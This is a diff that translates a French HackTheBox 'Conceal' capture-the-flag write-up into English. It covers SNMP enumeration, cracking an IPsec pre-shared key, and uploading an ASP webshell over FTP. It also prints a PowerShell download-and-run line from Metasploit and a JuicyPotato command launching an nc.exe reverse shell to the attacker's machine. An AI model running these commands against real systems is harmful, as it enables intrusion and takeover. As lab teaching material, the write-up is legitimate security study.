@@ -1,7 +1,7 @@
 ---
 title: "HackTheBox - Conceal"
 description: test.png
-tags: ["Dans cet article je vous présente comment être root dans la boîte Conceal, c'était une boîte très amusante mais en même temps assez difficile car il y avait pas mal de configuration à faire au niveau du protocole IPSEC pour avoir un shell dans le système. Pour le root il y avait un système qui était activé et on pouvais être root grâce au programme Juicy Potato."]
+tags: ["In this article I present to you how to be root in the Conceal box, it was a very funny box but at the same time quite difficult because there was a lot of configuration to do at the level of the IPSEC protocol to have a shell in the system. For root there was a system which was activated and we could be root thanks to the Juicy Potato program."]
 ---
 
 ![Flower](../test.png)
@@ -13,23 +13,23 @@ Informations
 
 Résumé : <br />
 
-Le système Conceal, disponible sur la platform [HackTheBox](https://www.hackthebox.eu/), fut très intéressant et amusante. Le niveau de difficulté était plutôt élevée, étant donné qu’une bonne énumération était amplement suffisante. De plus, j’ai appris beaucoup de chose tout au long de l’exploitation des failles de ce système. <br />
+The Conceal system, available on the platform [HackTheBox](https://www.hackthebox.eu/), was very interesting and fun. The level of difficulty was rather high, given that a good enumeration was more than enough. In addition, I have learned a lot of choice throughout the exploitation of the flaws in this system.
 
-- Il y a le port Simple Network Manager Protocol (SNMP) qui est ouvert, et il a été mis en public concrètement, et nous trouvons une adresse PSK. <br />
-- Ensuite, nous allons cracker la preshared key (PSK) utiliser durant la phase d’authentification à un Virtual Private Network (VPN) utilisant IPsec. <br />
-- Une bonne configuration pour avoir accès, avec le protocole IPSEC avec le programme StrongSwan. <br />
-- Nous devons créer un point de routage avec IPSEC pour rediriger les ports et d'accéder à la machine. <br />
-- On peut upload des fichiers dans le FTP, et ensuite d'exécuter le script dans la page web et faire son reverse shell. <br />
-- Pour l'accès admin, SeImpersonatePrivilege est activé donc on peut utiliser le programme JuicyPotato.
+- There is a Simple Network Manager Protocol (SNMP) port that is open, and it has been publicly released, and we find a PSK address. <br />
+- Next, we will crack the preshared key (PSK) used during the authentication phase to a Virtual Private Network (VPN) using IPsec. <br />
+- A good configuration to have access, with the IPSEC protocol with the StrongSwan program. <br />
+- We need to create a routing point with IPSEC to redirect the ports and access the machine. <br />
+- You can upload files to FTP, and then run the script on the web page and make a reverse shell. <br />
+- For administrator access, SeImpersonatePrivilege is enabled so on can use the JuicyPotato program.
 
 Source : <br />
 
-- https://www.zdnet.fr/actualites/la-faille-windows-alpc-deja-exploitee-39873227.htm <br />
+- https://github.com/riparino/Task_Scheduler_ALPC <br />
 - https://wiki.strongswan.org/projects/strongswan/wiki/UserDocumentation
 
 Nmap Scan
 ----
-Donc il y a aucun port ouvert visiblement donc va voir pour l'UDP et de chercher des ports qui peuvent être très intéressant pour l'énumération.
+So there is no visibly open port so look for the UDP and look for ports that can be very interesting for enumeration.
 
     root@Seyptoo:~/htb/box/Conceal# nmap -sC -sV -oA nmap/check 10.10.10.116
 
@@ -41,7 +41,7 @@ Donc il y a aucun port ouvert visiblement donc va voir pour l'UDP et de chercher
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 39.80 seconds
     
-Pour scanner les port utilisant le protocole de communication User Datagram Protocol (UDP), nous allons utiliser le programme masscan. Car au scan Transmission Control Protocol (TCP) il y avait aucun port d'ouvert.
+To scan the ports using the User Datagram Protocol (UDP), we will use the masscan program. Transmission control protocol (TCP) Because on scan there was no open port.
 
     root@Seyptoo:~/htb/box/Conceal# masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0
 
@@ -51,7 +51,7 @@ Pour scanner les port utilisant le protocole de communication User Datagram Prot
     Scanning 1 hosts [131070 ports/host]
     Discovered open port 161/udp on 10.10.10.116                                   
 
-D'après le scan que nous venons de faire, nous pouvons voir que le port 161 port utilisant le User Datagram Protocol (UDP) est ouvert. Ce port est le plus souvent utilisé par le service Simple Network Management Portocole (SNMP). Ce protocole est principalement utiliser par les administrateurs réseau afin d'obtenir des informations sur le systeme ou d'y effectuer des modifications.
+From the scan we just did, we can see that the port 161 port using the User Datagram Protocol (UDP) is open. This port is most often used by the Simple Network Management Portocole (SNMP) service. This protocol is mainly used by network administrators to obtain information about the system or to make modifications.
 
     root@Seyptoo:~/htb/box/Conceal# nmap -sU -sC -sV -p161 10.10.10.116
 
@@ -64,7 +64,7 @@ D'après le scan que nous venons de faire, nous pouvons voir que le port 161 por
 
 SNMP Enumeration
 ----
-Donc nous allons essayer d'exécuter le programme snmpwalk et d'énumérer le service en question.
+So we will try to run the snmpwalk program and list the service in question.
 
     root@Seyptoo:~/htb/box/Conceal# snmpwalk -c public -v 1 10.10.10.116
     [...SNIP...]
@@ -72,7 +72,7 @@ Donc nous allons essayer d'exécuter le programme snmpwalk et d'énumérer le se
     iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
     [...SNIP...]
     
-Comme vous pouvez le voir il y a une adresse PSK, cette adresse va nous permettre beaucoup de choses, tout d'abord essayons de cracker le hash, donc le hash est du NTLM. Donc j'ai créé un script en Python pour cracker le hash en question.
+As you can see there is a PSK address, this address will allow us a lot of things, first of all let's try to crack the hash, so the hash is from NTLM. So I created a Python script to crack the hash in question.
 
 {% highlight python %}
 #coding:utf-8
@@ -150,7 +150,7 @@ if __name__ == "__main__":
 
 {% endhighlight %}
 
-Donc le programme ressemble à ça concrètement vous avez juste à l'exécuter et le programme va cracker le hash, si vous souhaitez bruteforce le mot de passe ça va prendre un bon moment. Je vous conseille d'aller sur CrackStation.
+So the program looks like this concretely you just have to run and the program will crack the hash, if you want bruteforce the password it'll take a long time. I advise you to go to CrackStation.
 
 	root@Seyptoo:~/htb/box/Conceal# python NTLM.py /usr/share/wordlist/rockyou.txt 9C8B1A372B1878851BE2C097031B6E43
 	[-] ERROR NTLM/1000 : 9c8b1a372b1878851be2c097031b6e43:azerty
@@ -158,18 +158,19 @@ Donc le programme ressemble à ça concrètement vous avez juste à l'exécuter 
 
 	[+] NTLM : 9c8b1a372b1878851be2c097031b6e43:Dudecake1!
 
-Après un bon moment de bruteforce, il a enfin trouvé le mot de passe, mais je ne recommande pas d'utiliser le programme ça va prendre énormément de temps. Allez plutôt sur CrackStation.
+After a long time of bruteforce, he finally found the password, but I don't recommend using the program it will take a lot of time. Go to CrackStation instead.
 
 [![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/20/5/1558118186-capture-du-2019-05-17-20-36-09.png)](https://image.noelshack.com/fichiers/2019/20/5/1558118186-capture-du-2019-05-17-20-36-09.png)
 
 IPSEC Configuration
 ----
-Donc nous arrivons dans la partie la plus intéressante de la machine car c'est un moment où j'ai pris énormément de temps mais également de souffrance, j'ai pris vraiment beaucoup de temps. <br />
+So we come to the most interesting part of the machine because it was a time when I took a lot of time but also suffering, I really took a lot of time. <br />
 
-IPsec (Internet Protocol Security), défini par l'IETF comme un cadre de standards ouverts pour assurer des communications privées et protégées sur des réseaux IP, par l'utilisation des services de sécurité cryptographiques, est un ensemble de protocoles utilisant des algorithmes permettant le transport de données sécurisées sur un réseau IP. <br />
+IPsec (Internet Protocol Security), defined by the IETF as an open standards framework for ensuring private and protected communications over IP networks, through the use of cryptographic security services, is a set of protocols using algorithms allowing the transport of secure data over an IP network. <br />
 
-Donc nous allons modifier le fichier **/etc/ipsec.secrets** et enfin le fichier **/etc/ipsec.conf**, donc regardez les configurations ci-dessous. <br /><br />
-Fichier : ipsec.conf
+So we are going to modify the file **/etc/ipsec.secrets** and finally the file **/etc/ipsec.conf**, so look at the configurations below. <br /><br />
+
+File : ipsec.conf
 
 	config setup
 	    charondebug="all" 
@@ -193,14 +194,15 @@ Fichier : ipsec.conf
 	    fragmentation=yes
 	    keyingtries=1
 
-N'oubliez surtout pas de modifier l'adresse IP de l'interface tun0 dans le leftsubnet et dans le left, pour que il y a aucun problème au niveau de l'exécution. <br /><br />
-Fichier : ipsec.secrets
+Do not forget to change the IP address of the tun0 interface in the leftsubnet and in the left, so that there is no problem at the execution level. <br /><br />
+
+File : ipsec.secrets
 
 	# ipsec.secrets - strongSwan IPsec secrets file
 
 	%any %any : PSK "Dudecake1!"
-
-Je ne vais pas vous expliquer en détail le fonctionnement des lignes, car sinon ça va être très très long. Il y a déjà la documentation qui nous montre le fonctionnement. Donc pour lancer la configuration et de tester si la connexion marche avec succès lancée la commande juste ci-dessous.
+	
+I will not explain to you in detail the operation of the lines, because otherwise it will be very very long. There is already documentation that shows us how it works. So to launch the configuration and to test if the connection works successfully launched the command just below.
 
 	root@Seyptoo:~/htb/box/Conceal# ipsec up conceal
 	generating QUICK_MODE request 3539874152 [ HASH SA No ID ID ]
@@ -212,16 +214,16 @@ Je ne vais pas vous expliquer en détail le fonctionnement des lignes, car sinon
 	CHILD_SA conceal{2} established with SPIs c8dc7342_i dde379e8_o and TS 10.10.15.229/32 === 10.10.10.116/32[tcp]
 	connection 'conceal' established successfully
 
-La connexion a été established avec succès donc c'est parfait donc maintenant nous allons créés un point de routage, nous allons rediriger les ports vers notre réseau pour accéder aux ports filtrés de la machine, je vous ai faits un petit schéma ci-dessous pour que vous compreniez le système.
+The connection was established successfully so it's perfect so now we will create a routing point, we will redirect the ports to our network to access the filtered ports of the machine, I have made a small diagram below for that you understand the system.
 
 [![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/20/6/1558172167-capture-du-2019-05-17-12-18-09.png)](https://image.noelshack.com/fichiers/2019/20/6/1558172167-capture-du-2019-05-17-12-18-09.png)
 
-Donc pour rediriger les ports filtrés vers notre machine vous devez simplement taper la commande ci-dessous et vous allez voir que la redirection se fait très simplement.
+So to redirect the filtered ports to our machine you must simply type the command below and you will see that the redirection is done very simply.
 
 	root@Seyptoo:~/htb/box/Conceal# ipsec route conceal
 	'conceal' routed
 	
-Donc si on refait un scan de port TCP nous allons voir que il y'a des service ouvert dans la machine.
+So if we do a TCP port scan again we will see that there are services open in the machine.
 	
 	root@Seyptoo:~/htb/box/Conceal# nmap -sT -p1-65535 10.10.10.116 --min-rate 1000
 	Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-18 11:44 CEST
@@ -267,16 +269,17 @@ Donc si on refait un scan de port TCP nous allons voir que il y'a des service ou
 	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                         
 	Nmap done: 1 IP address (1 host up) scanned in 23.56 seconds
 
-Nous avons des informations très intéressantes, on peut voir qu'on peut se connecter en tant que Anonymous dans le FTP et on peut uploader des fichiers sur le système via le protocole FTP.
+We have very interesting information, we can see that we can connect as Anonymous in FTP and we can upload files to the system via the FTP protocol.
 	
 HTTP
 ----
-Donc si nous allons dans le serveur HTTP, il y'a pas grand chose donc pour ça je vais lancer une attaque gobuster pour voir si il y'a des dossiers intéréssant ou des fichiers.
+So if we go to the HTTP server, there is not much, so for that I will launch a gobuster attack to see if there are any interesting folders or files.
 
 	root@Seyptoo:~/htb/box/Conceal# gobuster -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.116
 	/upload (Status: 301)
 
-Donc le site web accepte seulement de l'asp ou bien du aspx, mais il accepte en aucun cas du PHP. Donc pour ça je vais upload un shell ASP WebShell pour IIS 8 dans le serveur pour envoyer des commandes. Un bon lien pour télécharger le shell. https://packetstormsecurity.com/files/137024/ASP-Webshell-For-IIS-8.html <br />
+So the website only accepts asp or aspx, but in no case does it accept PHP. So for that I will upload an ASP WebShell shell for IIS 8 to the server to send commands. A good link to download the shell.
+https://packetstormsecurity.com/files/137024/ASP-Webshell-For-IIS-8.html <br/>
 
 	root@Seyptoo:~/htb/box/Conceal# ftp 10.10.10.116
 	Connected to 10.10.10.116.
@@ -294,14 +297,14 @@ Donc le site web accepte seulement de l'asp ou bien du aspx, mais il accepte en 
 	1423 bytes sent in 0.00 secs (17.8563 MB/s)
 	ftp> 
 
-Donc après avoir upload le shell nous pouvons exécuter des commandes depuis curl.
+So after uploading the shell we can execute commands from curl.
 
 	root@Seyptoo:~/htb/box/Conceal# curl http://10.10.10.116/upload/index.asp -d "cmd=whoami"
 	[...SNIP...]
 	conceal\destitute
 	[...SNIP..]
 	
-Parfait nous sommes prêt pour le reverse shell nous allons utiliser metasploit le module web_delivery pour effectué notre reverse shell avec sans aucun problème.
+Perfect we are ready for the reverse shell we will use metasploit the web_delivery module to perform our reverse shell with no problem.
 
 	msf > use exploit/multi/script/web_delivery
 	msf exploit(multi/script/web_delivery) > set LHOST 10.10.15.229
@@ -309,11 +312,11 @@ Parfait nous sommes prêt pour le reverse shell nous allons utiliser metasploit 
 	msf exploit(multi/script/web_delivery) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 	msf exploit(multi/script/web_delivery) > set TARGET 4
 	
-Donc le code fournis en powershell il faut le mettre depuis le site web et non depuis curl car il y a des problèmes d'encodage etc.. Donc je vous conseille vivement d'aller sur le chemin directement. Le code fourni par Metasploit.
+So the code provided in powershell must be put from the website and not from curl because there are encoding problems etc. So I strongly advise you to go on the path directly. The code provided by Metasploit.
 
 	powershell.exe -nop -w hidden -c $z="echo ($env:temp+'\DF95KsPU.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.15.229:8080/mSErF4WvPeAoECb', $z); invoke-item $z
 	
-Après avoir exécuté le code powershell nous avons un shell, mais le problème nous sommes pas administrator.
+After running the powershell code we have a shell, but the problem is we are not administrator.
 
 	msf exploit(multi/script/web_delivery) > exploit
 	[*] 10.10.10.116     web_delivery - Delivering Payload                                                
@@ -331,7 +334,7 @@ Après avoir exécuté le code powershell nous avons un shell, mais le problème
 
 PrivEsc
 ----
-Le privesc n'est pas très compliqué sur la machine nous allons taper la commande ci-dessous. En exécutant whoami /priv, nous voyons que les droits de l'utilisateur nous permettront d'utiliser l'exploit juicy-potato pour s'élever à NT AUTORITY/SYSTEM. 
+The privesc is not very complicated on the machine we will type the command below. By running whoami /priv, we see that user rights will allow us to use the juicy-potato exploit to elevate to NT AUTORITY/SYSTEM.
 
 	
 	C:\Users\Windows\System32>whoami /priv
@@ -351,7 +354,7 @@ Le privesc n'est pas très compliqué sur la machine nous allons taper la comman
 	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 	SeTimeZonePrivilege           Change the time zone                      Disabled
 
-Nous devons choisir le CLSID approprié pour notre système d'exploitation. Nous allons d'abord vérifier quelle version de Windows est en cours d'exécution actuellement : 
+We must choose the appropriate CLSID for our operating system. We will first check which version of Windows is currently running : 
 
 	C:\inetpub\wwwroot\upload>systeminfo
 	
@@ -359,15 +362,15 @@ Nous devons choisir le CLSID approprié pour notre système d'exploitation. Nous
 	OS Name:                   Microsoft Windows 10 Enterprise
 	OS Version:                10.0.15063 N/A Build 15063
 	
-Ensuite, nous vérifions sur le site https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md la liste des CLSID pour le système d'exploitation. <br />
+Then, we check on the site https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md the list of CLSIDs for the operating system. <br />
 
-Nous allons utiliser {5BC7A3A1-E905-414B-9790-E511346F5CA6}, sans aucune raison particulière, puis exécuter JuicyPotato et exécuter un autre netcat pour générer un nouveau shell inversé pour nous.
+We will use {5BC7A3A1-E905-414B-9790-E511346F5CA6}, for no particular reason, then run JuicyPotato and run another netcat to generate a new reverse shell for us.
 
 	C:\inetpub\wwwroot\upload>juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.39 9001" -t * -c {5BC7A3A1-E905-414B-9790-E511346F5CA6}
 	[...SNIP...]
 	[+] CreateProcessWithTokenW OK
 	
-Et ensuite on a juste à faire le reverse shell depuis notre machine physique pour être administrateur.
+And then we just have to do the reverse shell from our physical machine to be administrator.
 
 	root@Seyptoo:~/htb/box/Conceal# nc -lvnp 9001
 	listening on [any] 9001 ...
@@ -380,4 +383,4 @@ Et ensuite on a juste à faire le reverse shell depuis notre machine physique po
 
 CONCLUSION
 ----
-Voilà, nous arrivons enfin au bout de cet article qui, je l’espère, vous aura plus. Une boîte vraiment intéréssante et concrètement assez originale, il y'avais pas mal de manipulation et de configurationà faire au niveau du protocole `IPSEC` mais ça reste une très bonne boîte.
+Here we are, we finally come to the end of this article which, I hope, will have you more. A really interesting box and concretely quite original, there was a lot of manipulation and configuration to do at the level of the `IPSEC` protocol but it's still a very good box.
